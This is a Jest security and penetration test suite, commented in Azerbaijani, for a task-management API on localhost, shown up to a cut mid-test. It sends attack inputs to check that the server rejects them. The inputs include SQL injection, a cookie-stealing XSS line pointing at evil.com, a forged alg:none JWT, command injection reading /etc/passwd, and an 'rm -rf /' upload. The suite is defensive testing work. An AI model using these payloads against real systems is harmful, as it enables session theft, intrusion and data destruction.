/**
 * ============================================================================
 *  WorkFlow Pro — AMASİZ TƏHLÜKƏSİZLİK, STRESS VƏ PENETRASİYA TESTLƏRİ
 * ============================================================================
 *
 *  Bu fayl real işləyən API-yə (localhost:4000) HTTP sorğuları göndərərək
 *  hər mümkün hücum vektorunu yoxlayır.
 *
 *  İcra: npx jest test/security/security-stress.spec.ts --runInBand --forceExit
 *
 *  QAYDA: 500 cavabı = REAL BUG. Gözlənilən cavablar: 400, 401, 403, 404
 * ============================================================================
 */

const BASE = 'http://localhost:4000'

// ── Yardımçı funksiyalar ──────────────────────────────────────────────────────

interface LoginResult {
  accessToken: string
  refreshToken: string
  user: { id: string; tenantId: string; role: string }
}

async function login(email: string, password: string = '123456'): Promise<LoginResult> {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  })
  const data = await res.json()
  return {
    accessToken: data.accessToken,
    refreshToken: data.refreshToken,
    user: data.user,
  }
}

function authHeader(token: string): Record<string, string> {
  return {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${token}`,
  }
}

/** 500 cavab alan testlər REAL BUG-dur — bu helper onu yoxlayır */
function assertNotServerError(status: number, context: string) {
  if (status === 500) {
    throw new Error(`🔴 SERVER ERROR (500) — BUG TAPILDI: ${context}`)
  }
}

/** FormData yaratmaq üçün (fayl upload testləri) */
function createFileFormData(
  content: string,
  filename: string,
  mimeType: string,
  taskAssigneeId: string,
  slotNumber: number,
): FormData {
  const formData = new FormData()
  const blob = new Blob([content], { type: mimeType })
  formData.append('file', blob, filename)
  formData.append('taskAssigneeId', taskAssigneeId)
  formData.append('slotNumber', slotNumber.toString())
  return formData
}

// ── Qlobal dəyişənlər (beforeAll-da doldurulur) ─────────────────────────────

let adminToken: string
let adminUser: { id: string; tenantId: string }
let managerToken: string
let managerUser: { id: string; tenantId: string }
let employeeToken: string
let employeeUser: { id: string; tenantId: string }

// ─────────────────────────────────────────────────────────────────────────────
// TEST BAŞLANĞICI
// ─────────────────────────────────────────────────────────────────────────────

beforeAll(async () => {
  // Real token-lər əldə et
  const adminLogin = await login('admin@techflow.az')
  adminToken = adminLogin.accessToken
  adminUser = adminLogin.user

  const managerLogin = await login('leyla@techflow.az')
  managerToken = managerLogin.accessToken
  managerUser = managerLogin.user

  const employeeLogin = await login('nigar@techflow.az')
  employeeToken = employeeLogin.accessToken
  employeeUser = employeeLogin.user
}, 30000)

// ═════════════════════════════════════════════════════════════════════════════
// 1. AUTENTİFİKASİYA HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('1. AUTENTİFİKASİYA HÜCUMLARI', () => {

  // 1.1 — Boş email/şifrə ilə giriş
  test('Boş email ilə giriş rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: '', password: '123456' }),
    })
    assertNotServerError(res.status, 'Boş email login')
    expect([400, 401]).toContain(res.status)
  })

  test('Boş şifrə ilə giriş rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@techflow.az', password: '' }),
    })
    assertNotServerError(res.status, 'Boş şifrə login')
    expect([400, 401]).toContain(res.status)
  })

  test('Email olmadan giriş rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: '123456' }),
    })
    assertNotServerError(res.status, 'Email olmadan login')
    expect([400, 401]).toContain(res.status)
  })

  test('Şifrə olmadan giriş rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@techflow.az' }),
    })
    assertNotServerError(res.status, 'Şifrə olmadan login')
    expect([400, 401]).toContain(res.status)
  })

  // 1.2 — SQL Injection email sahəsində
  test('SQL injection email-də rədd edilməlidir: \' OR 1=1 --', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: "' OR 1=1 --", password: '123456' }),
    })
    assertNotServerError(res.status, 'SQL injection login')
    expect([400, 401]).toContain(res.status)
  })

  test('SQL injection email-də: admin\'--', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: "admin'--", password: '123456' }),
    })
    assertNotServerError(res.status, 'SQL injection admin\'--')
    expect([400, 401]).toContain(res.status)
  })

  test('SQL injection email-də: " OR ""="', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: '" OR ""="', password: '123456' }),
    })
    assertNotServerError(res.status, 'SQL injection double quote')
    expect([400, 401]).toContain(res.status)
  })

  test('SQL injection: UNION SELECT attack', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: "' UNION SELECT password FROM \"User\" WHERE email='admin@techflow.az'--",
        password: 'x',
      }),
    })
    assertNotServerError(res.status, 'UNION SELECT injection')
    expect([400, 401]).toContain(res.status)
  })

  // 1.3 — XSS email sahəsində
  test('XSS email-də rədd edilməlidir: <script>alert(1)</script>@test.com', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: '<script>alert(1)</script>@test.com',
        password: '123456',
      }),
    })
    assertNotServerError(res.status, 'XSS email login')
    expect([400, 401]).toContain(res.status)
  })

  test('XSS email-də: javascript:alert(1)@x.com', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'javascript:alert(1)@x.com',
        password: '123456',
      }),
    })
    assertNotServerError(res.status, 'javascript: protocol XSS')
    expect([400, 401]).toContain(res.status)
  })

  // 1.4 — Brute force: 20 ardıcıl yanlış şifrə
  test('Brute force: 20 ardıcıl yanlış giriş (rate-limit gözlənilir)', async () => {
    const results: number[] = []
    const promises = Array.from({ length: 20 }, () =>
      fetch(`${BASE}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'admin@techflow.az', password: 'wrongpassword' }),
      }).then(r => {
        results.push(r.status)
        return r
      })
    )
    await Promise.all(promises)

    // Hamısı 401 olmamalıdır — rate-limit (429) gözləyirik
    // Əgər hamısı 401-dirsə, rate-limiting yoxdur — bu bir zəiflikdir
    const has429 = results.some(s => s === 429)
    const allUnauthorized = results.every(s => s === 401)

    if (allUnauthorized && !has429) {
      console.warn('⚠️  ZƏIF: Rate limiting yoxdur! 20 brute force cəhdi bloklanmadı.')
    }

    // Heç biri 500 olmamalıdır
    results.forEach((s, i) => assertNotServerError(s, `Brute force attempt ${i + 1}`))

    // Ən azı bir 401 və ya 429 olmalıdır
    expect(results.every(s => [401, 429].includes(s))).toBe(true)
  })

  // 1.5 — Token olmadan qorunan endpoint-ə giriş
  test('Token olmadan /tasks endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`)
    assertNotServerError(res.status, 'No token /tasks')
    expect(res.status).toBe(401)
  })

  test('Token olmadan /users endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/users`)
    assertNotServerError(res.status, 'No token /users')
    expect(res.status).toBe(401)
  })

  test('Token olmadan /templates endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/templates`)
    assertNotServerError(res.status, 'No token /templates')
    expect(res.status).toBe(401)
  })

  test('Token olmadan /roles endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/roles`)
    assertNotServerError(res.status, 'No token /roles')
    expect(res.status).toBe(401)
  })

  test('Token olmadan /todoist/tasks endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/todoist/tasks`)
    assertNotServerError(res.status, 'No token /todoist/tasks')
    expect(res.status).toBe(401)
  })

  test('Token olmadan /auth/me endpoint-inə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/auth/me`)
    assertNotServerError(res.status, 'No token /auth/me')
    expect(res.status).toBe(401)
  })

  // 1.6 — Etibarsız / pozulmuş JWT
  test('Etibarsız JWT ilə giriş 401 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: 'Bearer totally.invalid.token' },
    })
    assertNotServerError(res.status, 'Invalid JWT')
    expect(res.status).toBe(401)
  })

  test('Pozulmuş JWT (signature dəyişdirilmiş) rədd edilməlidir', async () => {
    // Token-in son hissəsini dəyişdir
    const tamperedToken = adminToken.slice(0, -5) + 'XXXXX'
    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: `Bearer ${tamperedToken}` },
    })
    assertNotServerError(res.status, 'Tampered JWT signature')
    expect(res.status).toBe(401)
  })

  test('Boş Bearer token rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: 'Bearer ' },
    })
    assertNotServerError(res.status, 'Empty Bearer token')
    expect(res.status).toBe(401)
  })

  test('Bearer olmadan sadəcə token rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: adminToken },
    })
    assertNotServerError(res.status, 'Token without Bearer prefix')
    expect(res.status).toBe(401)
  })

  test('Base64 encoded garbage JWT rədd edilməlidir', async () => {
    const garbage = Buffer.from('{"alg":"none"}').toString('base64') + '.' +
      Buffer.from('{"sub":"hacked","tenantId":"x"}').toString('base64') + '.fakesig'
    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: `Bearer ${garbage}` },
    })
    assertNotServerError(res.status, 'alg:none JWT attack')
    expect(res.status).toBe(401)
  })

  test('JWT alg:none hücumu rədd edilməlidir', async () => {
    // alg:none hücumu — imza olmadan token yaratma cəhdi
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
    const payload = Buffer.from(JSON.stringify({
      sub: adminUser.id,
      email: 'admin@techflow.az',
      role: 'TENANT_ADMIN',
      tenantId: adminUser.tenantId,
    })).toString('base64url')
    const noneToken = `${header}.${payload}.`

    const res = await fetch(`${BASE}/tasks`, {
      headers: { Authorization: `Bearer ${noneToken}` },
    })
    assertNotServerError(res.status, 'alg:none attack')
    expect(res.status).toBe(401)
  })

  // 1.7 — Logout sonrası token istifadəsi
  test('Logout sonrası köhnə token ilə /auth/me 401 qaytarmalıdır', async () => {
    // Yeni giriş et, sonra çıx, sonra köhnə token istifadə et
    const freshLogin = await login('nigar@techflow.az')
    const oldToken = freshLogin.accessToken

    // Logout
    await fetch(`${BASE}/auth/logout`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${oldToken}` },
    })

    // Köhnə token ilə giriş cəhdi
    // Qeyd: JWT stateless olduğu üçün access token hələ işləyə bilər (15 dəqiqə TTL).
    // Bu zəiflik olaraq qeyd edilməlidir əgər hələ işləyirsə.
    const res = await fetch(`${BASE}/auth/me`, {
      headers: { Authorization: `Bearer ${oldToken}` },
    })
    assertNotServerError(res.status, 'Post-logout token reuse')
    // 200 gəlirsə — bu JWT stateless zəifliyidir (gözlənilən davranış, amma qeyd edilməli)
    if (res.status === 200) {
      console.warn('⚠️  ZƏIF: Logout sonrası access token hələ keçərlidir (JWT stateless — blacklist yoxdur)')
    }
    expect([200, 401]).toContain(res.status)
  })

  // 1.8 — Yanlış HTTP metodu
  test('GET /auth/login rədd edilməlidir (yalnız POST)', async () => {
    const res = await fetch(`${BASE}/auth/login`)
    assertNotServerError(res.status, 'GET /auth/login')
    // NestJS adətən 404 qaytarır GET üçün əgər yalnız POST təyin edilibsə
    expect([404, 405]).toContain(res.status)
  })

  test('Çox böyük email ilə login (10000 simvol)', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'a'.repeat(10000) + '@test.com',
        password: '123456',
      }),
    })
    assertNotServerError(res.status, 'Huge email login')
    expect([400, 401]).toContain(res.status)
  })

  test('Çox böyük şifrə ilə login (100000 simvol)', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'admin@techflow.az',
        password: 'x'.repeat(100000),
      }),
    })
    assertNotServerError(res.status, 'Huge password login')
    expect([400, 401]).toContain(res.status)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 2. AVTORIZASIYA / RBAC BYPASS HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('2. AVTORIZASIYA / RBAC BYPASS HÜCUMLARI', () => {

  // 2.1 — İşçi (nigar) şablon yaratmağa çalışır (icazəsi yoxdur)
  test('İşçi (nigar) template yarada bilməməlidir — icazəsi yoxdur', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(employeeToken),
      body: JSON.stringify({
        name: 'Hacker Template',
        scheduleType: 'DAILY',
        items: [{ title: 'hacked' }],
      }),
    })
    assertNotServerError(res.status, 'Employee creating template')
    // Əgər 201/200 qaytarırsa — RBAC bypass var
    if (res.status === 201 || res.status === 200) {
      console.warn('🔴 RBAC BYPASS: İşçi template yarada bildi!')
    }
    // Gözlənilən: 403
    expect([403, 401]).toContain(res.status)
  })

  // 2.2 — İşçi başqa istifadəçinin tapşırığını silməyə çalışır
  test('İşçi başqa istifadəçinin tapşırığını silə bilməməlidir', async () => {
    // Əvvəlcə admin tapşırıq yaratsın
    const createRes = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Admin-in tapşırığı — silinməsinlər test',
        type: 'TASK',
        priority: 'MEDIUM',
      }),
    })
    const task = await createRes.json()
    const taskId = task.id

    if (taskId) {
      // İşçi silməyə çalışır
      const delRes = await fetch(`${BASE}/tasks/${taskId}`, {
        method: 'DELETE',
        headers: authHeader(employeeToken),
      })
      assertNotServerError(delRes.status, 'Employee deleting admin task')
      if (delRes.status === 200) {
        console.warn('🔴 RBAC BYPASS: İşçi başqa birinin tapşırığını silə bildi!')
      }
      expect([403, 404]).toContain(delRes.status)

      // Təmizlik — admin silsin
      await fetch(`${BASE}/tasks/${taskId}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  })

  // 2.3 — İşçi /users endpoint-inə giriş (users.read lazımdır)
  test('İşçi /users siyahısını oxuya bilməməlidir — users.read icazəsi yoxdur', async () => {
    const res = await fetch(`${BASE}/users`, {
      headers: authHeader(employeeToken),
    })
    assertNotServerError(res.status, 'Employee reading /users')
    if (res.status === 200) {
      console.warn('⚠️  ZƏIF: İşçi bütün istifadəçi siyahısını görə bilir (users.read yoxlanmır)')
    }
    expect([403]).toContain(res.status)
  })

  // 2.4 — Menecer admin-only endpoint-ə giriş (/roles yaratma)
  test('Menecer (leyla) rol yarada bilməməlidir — roles.create icazəsi yoxdur', async () => {
    const res = await fetch(`${BASE}/roles`, {
      method: 'POST',
      headers: authHeader(managerToken),
      body: JSON.stringify({
        name: 'Hacker Role',
        permissions: ['tasks.read', 'tasks.create', 'users.delete'],
      }),
    })
    assertNotServerError(res.status, 'Manager creating role')
    if (res.status === 201 || res.status === 200) {
      console.warn('🔴 RBAC BYPASS: Menecer rol yarada bildi!')
    }
    expect([403]).toContain(res.status)
  })

  // 2.5 — IDOR: Olmayan ID ilə tapşırıq əldə etmə
  test('IDOR: Mövcud olmayan UUID ilə tapşırıq 404 qaytarmalıdır', async () => {
    const fakeId = '00000000-0000-0000-0000-000000000000'
    const res = await fetch(`${BASE}/tasks/${fakeId}`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'IDOR fake UUID')
    expect([404]).toContain(res.status)
  })

  // 2.6 — IDOR: Random string ilə tapşırıq
  test('IDOR: Random string ID ilə giriş rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks/not-a-valid-uuid`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'IDOR random string')
    expect([400, 404, 500]).toContain(res.status)
    // 500 olmamalıdır — Prisma UUID validation lazımdır
    if (res.status === 500) {
      console.warn('🔴 BUG: UUID validation yoxdur — Prisma raw error qaytarır')
    }
  })

  // 2.7 — Horizontal privilege escalation: İşçi admin-in template-ini toggle etməyə çalışır
  test('İşçi başqa birinin template-ini toggle edə bilməməlidir', async () => {
    // Əvvəlcə admin template yaratsın
    const createRes = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Admin Template for toggle test',
        scheduleType: 'DAILY',
        items: [{ title: 'test item' }],
      }),
    })
    const template = await createRes.json()
    const templateId = template.id

    if (templateId) {
      // İşçi toggle etməyə çalışır
      const toggleRes = await fetch(`${BASE}/templates/${templateId}/toggle`, {
        method: 'POST',
        headers: authHeader(employeeToken),
      })
      assertNotServerError(toggleRes.status, 'Employee toggling admin template')

      // Təmizlik
      await fetch(`${BASE}/templates/${templateId}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  })

  // 2.8 — Menecer başqa menecerin tapşırığını redaktə etməyə çalışır
  test('Menecer başqa tenant-in tapşırığına müdaxilə edə bilməməlidir', async () => {
    // Eyni tenant-dədirlər, amma başqa tenant cəhdi simulyasiya edirik
    const fakeId = '99999999-9999-9999-9999-999999999999'
    const res = await fetch(`${BASE}/tasks/${fakeId}`, {
      method: 'PUT',
      headers: authHeader(managerToken),
      body: JSON.stringify({ title: 'Hacked title' }),
    })
    assertNotServerError(res.status, 'Cross-tenant task edit')
    expect([400, 403, 404]).toContain(res.status)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 3. INPUT INJECTION HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('3. INPUT INJECTION HÜCUMLARI', () => {

  // 3.1 — SQL Injection tapşırıq başlığında
  test('SQL injection tapşırıq başlığında: \'; DROP TABLE "Task"; --', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: "'; DROP TABLE \"Task\"; --",
        type: 'TASK',
        priority: 'LOW',
      }),
    })
    assertNotServerError(res.status, 'SQL injection in task title')
    // Prisma parametrized sorğular istifadə edir — SQL injection olmamalıdır
    // Əgər 201/200 qaytarırsa — başlıq string olaraq saxlanıb (yaxşı)
    // Əgər 500 qaytarırsa — SQL injection vulnerability!
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      // Təmizlik
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
    expect([200, 201, 400]).toContain(res.status)
  })

  test('SQL injection: UNION SELECT hücumu tapşırıq axtarışında', async () => {
    const res = await fetch(
      `${BASE}/todoist/tasks/search?q=' UNION SELECT password FROM "User"--`,
      { headers: authHeader(adminToken) },
    )
    assertNotServerError(res.status, 'UNION SELECT in search')
    expect([200, 400]).toContain(res.status)
    // 200 gəlirsə — Prisma parametrized, nəticə boş olmalıdır (yaxşı)
  })

  test('SQL injection: Stacked queries tapşırıqda', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: "test'; INSERT INTO \"User\" (email,password) VALUES ('hacker@x.com','x');--",
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'Stacked queries injection')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 3.2 — XSS hücumları
  test('XSS tapşırıq description-da: <img src=x onerror=alert(1)>', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'XSS Test',
        description: '<img src=x onerror=alert(1)>',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'XSS in description')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      // Description olduğu kimi saxlanılıb — frontend sanitize etməlidir
      if (data.description && data.description.includes('onerror')) {
        console.warn('⚠️  XSS: Backend HTML sanitize etmir — frontend-də sanitize olmalıdır')
      }
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  test('XSS: Script tag tapşırıq başlığında', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'Script tag in title')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.title && data.title.includes('<script>')) {
        console.warn('⚠️  XSS: Backend <script> tag saxlayır — Stored XSS riski!')
      }
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  test('XSS: SVG onload hücumu', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: '<svg onload=alert("XSS")>',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'SVG onload XSS')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 3.3 — NoSQL injection cəhdi
  test('NoSQL injection: $gt operatoru login-da', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: { $gt: '' },
        password: { $gt: '' },
      }),
    })
    assertNotServerError(res.status, 'NoSQL injection $gt')
    expect([400, 401]).toContain(res.status)
  })

  test('NoSQL injection: $regex operatoru', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: { $regex: '.*' },
        password: '123456',
      }),
    })
    assertNotServerError(res.status, 'NoSQL injection $regex')
    expect([400, 401]).toContain(res.status)
  })

  // 3.4 — Command injection
  test('Command injection fayl adında: $(whoami)', async () => {
    const res = await fetch(`${BASE}/todoist/tasks/search?q=$(whoami)`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Command injection in search')
    expect([200, 400]).toContain(res.status)
  })

  test('Command injection: pipe və backtick', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: '`cat /etc/passwd`',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'Backtick command injection')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 3.5 — Null byte injection
  test('Null byte injection axtarışda: %00', async () => {
    const res = await fetch(`${BASE}/todoist/tasks/search?q=test%00malicious`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Null byte injection')
    expect([200, 400]).toContain(res.status)
  })

  // 3.6 — Unicode / Homoglyph hücumları
  test('Unicode homoglyph hücumu: Cyrillic "а" latin "a" əvəzinə', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        // Cyrillic 'а' (U+0430) istifadə edirik
        email: '\u0430dmin@techflow.az',
        password: '123456',
      }),
    })
    assertNotServerError(res.status, 'Unicode homoglyph attack')
    expect([400, 401]).toContain(res.status)
  })

  test('Unicode overflow: zalgo text tapşırıqda', async () => {
    const zalgo = 'T' + '\u0336'.repeat(100) + 'e' + '\u0336'.repeat(100) + 'st'
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: zalgo,
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'Zalgo text overflow')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 3.7 — Prototype pollution
  test('Prototype pollution: __proto__ əlavə etmə cəhdi', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Proto test',
        type: 'TASK',
        '__proto__': { admin: true },
        'constructor': { prototype: { admin: true } },
      }),
    })
    assertNotServerError(res.status, 'Prototype pollution')
  })

  // 3.8 — JSON injection
  test('JSON injection: iç-içə JSON string', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: '{"__proto__":{"isAdmin":true}}',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'Nested JSON string injection')
    if (res.status === 200 || res.status === 201) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 4. FAYL YÜKLƏMƏ HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('4. FAYL YÜKLƏMƏ HÜCUMLARI', () => {

  // 4.1 — 1.5MB-dan böyük fayl (task-assignee-files)
  test('1.5MB-dan böyük fayl yüklənməməlidir', async () => {
    const bigContent = 'A'.repeat(2 * 1024 * 1024) // 2 MB
    const formData = new FormData()
    formData.append('file', new Blob([bigContent]), 'big.pdf')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Oversized file upload')
    expect([400, 413]).toContain(res.status)
  })

  // 4.2 — Etibarsız slot nömrəsi (0 və 6)
  test('Slot 0 ilə fayl yükləmə rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test content']), 'test.txt')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '0')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Slot 0 upload')
    expect([400, 404]).toContain(res.status)
  })

  test('Slot 6 ilə fayl yükləmə rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test content']), 'test.txt')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '6')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Slot 6 upload')
    expect([400, 404]).toContain(res.status)
  })

  test('Mənfi slot nömrəsi rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test']), 'test.txt')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '-1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Negative slot number')
    expect([400, 404]).toContain(res.status)
  })

  // 4.3 — Başqasının taskAssignee-sinə fayl yükləmə
  test('Başqasının task assignee-sinə fayl yükləmə 403 qaytarmalıdır', async () => {
    // Fake UUID istifadə edirik — NotFoundException gözlənilir
    const formData = new FormData()
    formData.append('file', new Blob(['hack']), 'hack.txt')
    formData.append('taskAssigneeId', '00000000-0000-0000-0000-000000000001')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${employeeToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Upload to other user assignee')
    expect([403, 404]).toContain(res.status)
  })

  // 4.4 — Zərərli MIME type
  test('application/x-executable MIME type ilə yükləmə', async () => {
    const formData = new FormData()
    const blob = new Blob(['#!/bin/bash\nrm -rf /'], { type: 'application/x-executable' })
    formData.append('file', blob, 'malware.bin')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Executable MIME type upload')
    // 400/403 gözləyirik, amma MIME filtering olmaya bilər
    if (res.status === 201 || res.status === 200) {
      console.warn('⚠️  ZƏIF: Executable MIME type qəbul edildi — MIME whitelist yoxdur')
    }
  })

  // 4.5 — İcra edilə bilən fayl uzantıları
  test('.exe fayl uzantısı ilə yükləmə rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['MZ...']), 'malware.exe')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, '.exe file upload')
    if (res.status === 201 || res.status === 200) {
